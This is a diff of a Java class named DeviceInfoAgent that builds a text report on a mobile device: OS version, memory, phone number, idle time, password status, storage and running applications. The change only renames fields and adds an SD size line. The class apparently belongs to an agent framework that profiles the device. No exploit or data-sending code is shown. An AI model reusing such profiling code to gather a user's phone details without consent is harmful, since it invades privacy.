@@ -161,23 +161,25 @@ public final class DeviceInfoAgent extends Agent {
         // sb.append("\nDEVICE\n------\n");
 
         // OS Version
-        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
-        sb.append("RAM: " + Runtime.getRuntime().totalMemory() + "\n");
+        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
+        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");
+        
+        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
         sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
         sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
         sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
         sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
-        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
         sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
         sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
         // DISK
-        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
+        sb.append("Flash Size: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
 
-        sb.append("internal space: " + Path.freeSpace(Path.USER) + " Bytes\n");
+        sb.append("Free flash: " + Path.freeSpace(Path.USER) + " Bytes\n");
         if (Path.isSDAvailable()) {
-            sb.append("SD space: " + Path.freeSpace(Path.SD) + " Bytes\n");
+            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
+            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
         }
 
         sb.append(getRunningApplications());
